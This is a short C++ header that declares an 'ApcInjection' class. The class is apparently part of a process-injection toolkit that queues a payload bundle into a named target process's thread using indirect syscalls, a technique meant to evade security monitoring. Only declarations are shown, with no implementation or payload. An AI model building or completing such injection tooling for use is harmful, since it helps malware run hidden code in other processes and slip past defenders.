#ifndef APC_INJECTION_H
#define APC_INJECTION_H

#include "I_InjectionTechnique.h"
#include "InjectionResult.h"
#include "SyscallData.h"
#include <windows.h>
#include <winternl.h>

class ApcInjection : public I_InjectionTechnique {
public:
    ApcInjection(HMODULE hNtdll);
    ~ApcInjection() = default;

    InjectionResult inject(
        const std::string& processName, 
        const std::vector<unsigned char>& payloadBundle,
        size_t codeOffset
    ) override;

    const char* getName() const override { return "APC Injection (mit Indirect Syscalls)"; }

private:
    bool resolveSyscalls();
    DWORD findFirstThread(DWORD processId);

    HMODULE hNtdll;
};

#endif // APC_INJECTION_H 